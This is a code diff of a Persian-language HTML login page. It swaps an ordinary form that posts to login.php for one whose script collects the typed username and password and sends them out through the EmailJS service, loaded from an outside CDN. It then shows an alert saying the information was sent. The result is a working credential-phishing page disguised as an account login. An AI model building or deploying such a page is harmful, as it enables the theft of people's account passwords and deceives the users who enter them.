@@ -3,58 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ورود به حساب</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f4f4f4;
-        }
-        .login-container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            background: #0095f6;
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #007bbf;
-        }
-        .forgot-password {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #0095f6;
-        }
-    </style>
+    <title>ورود به حساب کاربری</title>
 </head>
 <body>
-    <div class="login-container">
-        <h2>ورود به حساب</h2>
-        <form action="login.php" method="post">
-            <input type="text" name="username" placeholder="نام کاربری یا ایمیل" required>
-            <input type="password" name="password" placeholder="رمز عبور" required>
-            <button type="submit">ورود</button>
-        </form>
-        <a class="forgot-password" href="#">رمز عبور را فراموش کرده‌اید؟</a>
-    </div>
+
+    <form onsubmit="sendMail(); return false;">
+        <label>نام کاربری:</label>
+        <input type="text" id="username" required>
+        
+        <label>رمز عبور:</label>
+        <input type="password" id="password" required>
+        
+        <button type="submit">ورود</button>
+    </form>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("YOUR_USER_ID"); // ‏Shy1_ylO4pa-Kxzo2
+
+        function sendMail() {
+            let params = {
+                username: document.getElementById("username").value,
+                password: document.getElementById("password").value
+            };
+
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+                .then(response => {
+                    alert("اطلاعات ارسال شد!");
+                }, error => {
+                    alert("خطا در ارسال اطلاعات.");
+                });
+        }
+    </script>
+
 </body>
 </html>
